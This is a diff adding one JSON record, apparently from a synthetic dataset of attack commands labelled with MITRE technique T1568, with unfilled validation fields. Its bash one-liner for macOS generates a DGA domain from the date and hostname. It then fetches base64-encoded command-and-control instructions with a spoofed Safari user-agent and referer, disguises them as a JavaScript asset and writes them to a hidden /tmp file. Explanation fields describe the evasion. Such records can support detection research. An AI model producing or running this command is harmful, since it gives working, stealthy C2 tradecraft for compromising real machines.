@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "seed=\"$(date -u +%Y%m%d)-$(hostname)\"; dga=\"$(echo -n \"$seed\" | md5 -q | cut -c1-12).cdn-update-mirror.net\"; ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15\"; wget -qO- --user-agent=\"$ua\" --referer=\"https://www.cdn-update-mirror.net/\" --header=\"Accept-Language: en-US,en;q=0.9\" --limit-rate=60k --timeout=10 --tries=2 --wait=1 --random-wait \"http://$dga/assets/js/app.js\" | /usr/bin/base64 -D > /tmp/.c2_cmd",
+  "explanation": "Generates a DGA-based domain at runtime and pulls base64-encoded C2 instructions over HTTP with a browser-like User-Agent and referer to blend in. Dynamic resolution via DGA supports resilient C2 per T1568.",
+  "rationale_steps": [
+    "Build DGA domain from UTC date and hostname (runtime dynamic resolution).",
+    "Mimic normal web browsing with Safari UA, referer, language header, timing and rate limits.",
+    "Fetch instructions disguised as a JS asset and decode from base64 to a local file."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-aea61e14",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
